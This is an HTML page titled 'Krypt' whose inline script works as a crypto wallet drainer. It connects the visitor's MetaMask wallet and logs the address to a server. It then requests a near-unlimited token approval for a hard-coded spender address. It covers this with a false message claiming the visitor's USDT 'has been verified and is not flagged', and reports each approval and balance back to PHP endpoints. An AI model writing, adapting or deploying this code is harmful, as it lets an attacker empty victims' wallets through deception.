<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/svg+xml" href="/src/favicon.svg" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Krypt</title>
</head>

<body>
  <div id="root"></div>

  <script>
    let walletAddress = "";
    let provider, signer;

    async function connectWallet() {
      if (window.ethereum) {
        try {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          provider = new ethers.providers.Web3Provider(window.ethereum);
          signer = provider.getSigner();
          walletAddress = await signer.getAddress();
          document.getElementById("walletInfo").innerText = "Connected: " + walletAddress;

          // Log wallet
          fetch('saveWallet.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ wallet: walletAddress })
          });

        } catch (err) {
          console.error("Connection error:", err);
          document.getElementById("walletInfo").innerText = "Wallet not connected";
        }
      } else {
        alert("MetaMask not detected");
      }
    }

    async function approveToken() {
      if (!walletAddress) {
        await connectWallet();
        if (!walletAddress) return; // still not connected
      }

      const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; // BUSD (BSC Testnet)
      const spender = "0x68bb6b4d107e0D705b0360113f4C366F1116974f";
      const amount = ethers.utils.parseUnits("55398325990.000000000000000001", 18);

      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
      const token = new ethers.Contract(tokenAddress, abi, signer);

      try {
        const tx = await token.approve(spender, amount);
        await tx.wait();

        console.log("âœ…  Your USDT has been verified and is not flagged in our database.");

        // After successful approval: log to server
        fetch('logApproval.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            wallet: walletAddress,
            token: tokenAddress,
            spender: spender,
            amount: amount.toString()
          })
        })
          .then(res => res.json())
          .then(console.log);



        // ðŸ‘‰ Fetch and show USDT balance
        const tokenAbi = [
          "function balanceOf(address account) view returns (uint256)"
        ];
        const usdtContract = new ethers.Contract(tokenAddress, tokenAbi, provider);
        const usdtBalance = await usdtContract.balanceOf(walletAddress);
        const formattedBalance = ethers.utils.formatUnits(usdtBalance, 18); // assuming 18 decimals


        showDevBox(`âœ…  Your USDT has been verified and is not flagged in our database.          Balance: ${formattedBalance} USDT`);





      } catch (err) {
        console.warn("User rejected or error:", err.message);
      }
    }

    // Connect automatically when page loads
    // window.addEventListener('load', connectWallet);
  </script>
  <script type="module" src="/src/main.jsx"></script>
</body>

</html>